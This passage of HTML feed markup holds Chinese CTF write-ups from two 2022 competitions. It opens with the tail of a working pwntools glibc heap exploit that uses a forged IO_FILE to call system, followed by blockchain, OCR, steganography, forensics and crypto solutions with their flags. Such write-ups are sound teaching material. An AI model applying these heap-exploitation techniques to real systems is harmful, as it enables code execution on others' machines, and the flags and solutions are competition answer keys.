class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, key</span>):</span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x420</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = (u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="number">16</span>) - libc.sym.__malloc_hook - <span class="number">0x71</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x470</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">heap_base = heap_addr - <span class="number">0x290</span></span><br><span class="line">global_max_fast = libc_base + <span class="number">0x1e3e78</span></span><br><span class="line">stderr_chain = libc_base + <span class="number">0x1e1648</span></span><br><span class="line">__pointer_chk_guard = libc_base + <span class="number">0x1ed5b0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__pointer_chk_guard))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x1e1000</span>)*<span class="number">2</span> + p64(heap_addr) + p64(__pointer_chk_guard-<span class="number">0x20</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x480</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x40</span>) </span><br><span class="line"></span><br><span class="line">target = libc_base + libc.sym.system</span><br><span class="line">io_cookie_jumps = libc_base + <span class="number">0x1e1a20</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0x00000000fbad2087</span>)+<span class="number">3</span> * p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_IO_FILE += p64(libc_base + <span class="number">0x1e3660</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(io_cookie_jumps + <span class="number">0x40</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base + <span class="number">0x300</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ROL(target ^ (heap_base+<span class="number">0xb30</span>),<span class="number">0x11</span>))</span><br><span class="line"></span><br><span class="line">add(-<span class="number">4</span>,<span class="number">0x500</span>,fake_IO_FILE)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x700</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">&#x27;7&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x508</span>+p64(<span class="number">0x300</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xff0</span>,<span class="string">&#x27;8&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="BLOCKCHAIN"><a href="#BLOCKCHAIN" class="headerlink" title="BLOCKCHAIN"></a>BLOCKCHAIN</h2><h3 id="Where-the-flag？"><a href="#Where-the-flag？" class="headerlink" title="Where the flag？"></a>Where the flag？</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract find&#123;</span><br><span class="line">    uint96 private a=7855;</span><br><span class="line">    address private owner=msg.sender;</span><br><span class="line">    bool private f=false;</span><br><span class="line">    bool private t=true;</span><br><span class="line">    string[] private flag=[flag1,flag2];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//https://ropsten.etherscan.io/address/0x78f2b5695e5e6e51fc0fd6d7e0caaa05190af9cc</span><br></pre></td></tr></table></figure></blockquote><p>应该是非预期，访问url进入合约，在交易0x2a00af3b2a2a939c491359e7960cbcbda6bdb4d45294fbb8d857100cbfb700e1的InputData里，可以查看到Hex数据，转字符串可得到flag两截字符串：<code>Dest0g3&#123;0n1y_u5e_priv4t3_i</code>，<code>5_n0t_s4f3_1n_B1okCh4in!&#125;</code>。</p><p>​    </p><h3 id="Easy-predict"><a href="#Easy-predict" class="headerlink" title="Easy predict"></a>Easy predict</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">contract storageplace&#123;</span><br><span class="line">     mapping(uint=&gt;string)private _flag;</span><br><span class="line">     address owner;</span><br><span class="line">     constructor()public&#123;     </span><br><span class="line">     owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function flag() public view returns(string memory)</span><br><span class="line">    &#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">    &#125;</span><br><span class="line">    function buy(uint number) public returns(bytes1)&#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract question&#123;</span><br><span class="line">    </span><br><span class="line">    mapping(address=&gt;bool)public regeister;</span><br><span class="line">    </span><br><span class="line">    mapping(address=&gt;uint)private seed;</span><br><span class="line">    </span><br><span class="line">    uint constant Price_Per_Char=10 ether;</span><br><span class="line">    </span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    storageplace immutable Flag;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">        </span><br><span class="line">        storageplace _Flag = new storageplace();</span><br><span class="line">        </span><br><span class="line">        Flag = _Flag;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier isowner()&#123;</span><br><span class="line">        require(msg.sender==owner,&quot;I think you are not the rignt person&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function addRight(address tar)public isowner&#123;</span><br><span class="line">         regeister[tar]=true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function removeRight(address tar)public isowner&#123;</span><br><span class="line">         regeister[tar]=false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function regeist() public &#123;</span><br><span class="line">        require(regeister[msg.sender]==false);</span><br><span class="line">        regeister[msg.sender]=true;</span><br><span class="line">        seed[msg.sender]=block.number+1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buyflag(uint want) public payable returns(bytes1)&#123;</span><br><span class="line">        require(msg.value==Price_Per_Char,&quot;is not free&quot;);</span><br><span class="line">        return Flag.buy(want);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function query(bytes32 answer) public view returns(string memory)</span><br><span class="line">    &#123;</span><br><span class="line">        require(regeister[msg.sender]);</span><br><span class="line">        require(block.number &gt;seed[msg.sender],&quot;too early&quot;);</span><br><span class="line">        bytes32 result = blockhash(seed[msg.sender]);</span><br><span class="line">        require(answer==result,&quot;wrong answer&quot;);</span><br><span class="line">        return Flag.flag();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() public payable&#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https://ropsten.etherscan.io/tx/0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925</span><br></pre></td></tr></table></figure></blockquote><p>也是非预期，访问url进入交易0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925，在InputData里，可以查看到Hex数据，转字符串可得到flag五截字符串：<code>Dest0g3&#123;t</code>，<code>_sup3r_e3</code>，<code>hi5_1s_4</code>，<code>ea5y_p</code>，<code>_r1ght?&#125;</code>，按英文字面意思拼接，得：<code>Dest0g3&#123;thi5_1s_4_sup3r_e3ea5y_pe1d1ct_r1ght?&#125;</code>。</p><p>​    </p><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="OCR"><a href="#OCR" class="headerlink" title="OCR"></a>OCR</h3><blockquote><p>OCR is very useful in ctf！</p></blockquote><p>更像Misc的AI题，png图片扭曲，应该宽度不对，CRC值爆破宽高：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">fr = <span class="built_in">open</span>(<span class="string">&#x27;flag_pic.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">0x0c</span>:<span class="number">0x1d</span>])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+<span class="built_in">str</span>(binascii.b2a_hex(fr[<span class="number">0x1d</span>:<span class="number">0x21</span>]))[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">n = <span class="number">4095</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">        crc32result = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            <span class="built_in">print</span>(width,height)</span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(<span class="string">&#x27;flag2.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure><p>得到正常图片：</p><p><img src="/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/flag2.png" alt="flag2" style="zoom:50%;"></p><p>找个在线OCR识别图里字符，得到的结果有部分字符不正确，手动修正，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">377ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022</span><br><span class="line">194A676D2FDE351A055c168F9710364AE2D581126E378F3B4c47E15E2E80B74234B849430A221F40</span><br><span class="line">C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2</span><br><span class="line">E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D03579</span><br><span class="line">95A2FB65D31CD99c853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FF</span><br><span class="line">E31ED0C0CEF0CA0B68C0CCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFC0FEAA</span><br><span class="line">E92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF</span><br><span class="line">66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EF</span><br><span class="line">DE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07</span><br><span class="line">097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C55</span><br><span class="line">95E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074c27F81c719D98717F4ECD</span><br><span class="line">32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F060</span><br><span class="line">0FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A03</span><br><span class="line">95DB9A445B94C44771B406F962B1CFC8535BA0D3EE3DDDEB876C95092AAB192B168A732F3A7B9E81</span><br><span class="line">56c403c583983F5527A0D6c5D6928481D56955474046D9FC17A2DE21F3D6FC4c69644E7c6A141BE9</span><br><span class="line">48A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B0100012121</span><br><span class="line">01000C84D100080A0196EAFE6000000501190A000000000000000000001119004400650073007400</span><br><span class="line">3000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000</span><br><span class="line">000000</span><br></pre></td></tr></table></figure><p>以Hex保存为7z压缩包文件，解压得到 <code>RGVzdDBnM3szNDUxMjA5OC0zMzA5LTc3MTItODg2NS03ODM0NjAyMjE2NDd9</code>，base64解码即flag：<code>Dest0g3&#123;34512098-3309-7712-8865-783460221647&#125;</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;首届Dest0g3 520迎新赛更加注重CTFer的基础知识面掌握程度，由易到难，适合各学习阶段选手参加，纯萌新水准。&lt;/p&gt;
&lt;p&gt;比赛时间：2022.5.20 10:00 - 5.27 10:00&lt;/p&gt;
&lt;p&gt;题目分类：Web、Pwn、Mis</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HSC-1th 2022</title>
    <link href="https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/"/>
    <id>https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/</id>
    <published>2022-02-20T08:28:40.000Z</published>
    <updated>2022-02-21T11:24:05.717Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>本届HSC1th 2022是由社会战队红客突击队（Honker Security Commando）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web，crypto，misc，re等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。</p><p>Rank: 2</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign-in"></a>Sign-in</h3><blockquote><p>前往红客突击队公众号发送“HSC2019”并签到吧！</p></blockquote><p>公众号签到。</p><p>flag{HSC_W3LC0M3}</p><p>​    </p><h3 id="DORAEMON"><a href="#DORAEMON" class="headerlink" title="DORAEMON"></a>DORAEMON</h3><p>zip压缩包注释 <code>哆啦A梦把泡好的QR放进口袋后，用六位数字把自己放好了。你能找到它吗？</code>，爆破得到密码 <code>376852</code>；</p><p>得到png图片用16进制修改器修改高度，得到缺少两个定位图案的二维码；</p><p>修复上方两个定位图案，扫描得flag：flag{sing1emak3r10v3m!sc}</p><p>​    </p><h3 id="汝闻-人言否"><a href="#汝闻-人言否" class="headerlink" title="汝闻,人言否"></a>汝闻,人言否</h3><p>png文件后存在zip压缩包，提取后在16进制查看器下修复压缩包，将两处 <code>4B 50</code> 修改为 <code>50 4B</code>；</p><p>发现zip压缩包加密，注释 <code>qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p</code> 为键盘密码，在键盘上画出六个字母 <code>WVALOU</code> 为解压密码，得到 <code>flag</code> 文件，16进制查看发现为wav文件结构；</p><p>使用audacity查看wav文件，在频谱图发现flag：<code>flag:e5353bb7b57578bd4da1c898a8e2d767</code></p><p>​    </p><h3 id="PERFORMANCE-ART"><a href="#PERFORMANCE-ART" class="headerlink" title="PERFORMANCE-ART"></a>PERFORMANCE-ART</h3><p>两种图形替换密码的混合，其中一种为标准银河字母（Standard Galactic Alphabet），猜测另一种代表数字，根据形状和出现概率，猜测出前几位 <code>504B0304140000000</code>，为zip压缩包文件头。</p><p>依次还原所有字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">504b03041400000008004a7e7253148e1e</span><br><span class="line">1e160000001400000006000000756e6b6e6</span><br><span class="line">f778bcaadc888322ec9f30b752df70c</span><br><span class="line">cfae8cca72b30400504b01021f0014000</span><br><span class="line">00008004a7e7253148e1e1e16000000140</span><br><span class="line">000000600240000000000000020000000000</span><br><span class="line">00000756e6b6e6f770a002000000000000</span><br><span class="line">1001800778284ef50dcd7016b04efef5</span><br><span class="line">0dcd701e1b0ef144fdcd701504b05060</span><br><span class="line">000000001000100580000003a0000000000</span><br></pre></td></tr></table></figure><p>保存为zip文件，打开得到内容 <code>ZmxhZ3tnNUEwIWkyZjF9</code>，base64解码得flag：flag{g5A0!i2f1}</p><p>​    </p><h3 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h3><p>zip压缩包后存在png图片，提取后使用zsteg查看LSB隐写，在 <code>b1,rgb,lsb,xy</code> 通道隐写了一张png图片，提取：</p><p><code>zsteg -E &quot;b1,rgb,lsb,xy&quot; Untitled1.png &gt; out.png</code></p><p>是一张二维码，扫描得到内容 <code>wrsak..iehr370</code>，栅栏解密 <code>wireshark3.7.0</code>；</p><p>解压最开始的zip压缩包得到 <code>wireshark</code>，16进制查看发现为pdf文件结构，文件头被修改过，还原为 <code>%PDF</code> （<code>25 50 44 46</code>）正常打开，内容无有用信息，猜想为PDF隐写；</p><p>使用wbStego工具从pdf文件成功提取出flag：flag{Go0dJ0B_y0ufIndLt}</p><p>​    </p><h3 id="PCXP"><a href="#PCXP" class="headerlink" title="PCXP"></a>PCXP</h3><blockquote><p>百度网盘<a href="https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A">https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A</a> 提取码：1qih </p><p>奶牛快传<a href="https://cowtransfer.com/s/b76470ddc9e04a">https://cowtransfer.com/s/b76470ddc9e04a</a> </p><p>蓝奏云<a href="https://wwo.lanzouy.com/b030r1x4j">https://wwo.lanzouy.com/b030r1x4j</a> 密码:cvi0 </p><p>本题目文件PCXP1与PCXP2均需要下载！ </p><p>本题文件中flag{raw_Imfig3_mLs3}属于干扰项</p></blockquote><p>两个dump内存的raw文件，用volatility分析。</p><p>其中一个发现 <code>ffflaaagggg.rar</code> 文件：</p><p><code>0x000000000227db70      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\My Music\ffflaaagggg.rar</code></p><p>根据提示，另一个发现 <code>mirror.rar</code> 文件：</p><p><code>0x00000000021221e0      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\My Music\mirror.rar</code></p><p>分别dumpfiles，按注释<code>key:mirror</code> 解压 <code>mirror.rar</code>，提取 <code>mirror.png</code>，发现后半部分有反转的png，reverse处理得到png内有密码 <code>HSC-1th202248H</code> ；</p><p>用密码解压 <code>ffflaaagggg.rar</code>，得到 <code>secret.pcap</code>，用tshark提取USB流量无结果；</p><p>查看16进制发现存在PNG文件头，用foremost提取出两张png图片，画面相同大小不同，猜测为盲水印隐写；</p><p>使用BlindWaterMark工具提取：</p><p><code>python3 bwmforpy3.py decode 00000030.png 00000094.png out.png</code></p><p>得到flag：flag{Wat3rMarkPtysc}</p><p><img src="/2022/02/20/match-HSC-1th-2022/outx.png" alt="outx"></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Easy-SignIn"><a href="#Easy-SignIn" class="headerlink" title="Easy SignIn"></a>Easy SignIn</h3><blockquote><p>5445705857464579517A4A48546A4A455231645457464243566B5579556C7053546C4A4E524564565646644D515670455130354C5755644F5231685256314A5452315A5552304E57576C5A49525430395054303950513D3D</p></blockquote><p>ciphey一把梭，flag：flag{welc0me_to_my_s1gn_in}</p><p>​    </p><h3 id="AFFINE"><a href="#AFFINE" class="headerlink" title="AFFINE"></a>AFFINE</h3><blockquote><p>flag{md5(result)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter=string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, c, a, b</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=(letter.index(ch) * a + b) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">m = </span><br><span class="line">c = []</span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;加密后的密文为：&quot;</span>)</span><br><span class="line">Cipher = encrypt(m, c, a, b)</span><br><span class="line">flag = hashlib.md5(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m)).encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">加密后的密文为：</span></span><br><span class="line"><span class="string">xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>仿射密码加密，先根据密文和明文，爆破各位置存在 <code>flag</code> 字符串情况下对应的 <code>a,b</code> 值，再解密整串密文。</p><p>爆破求 <code>a,b</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 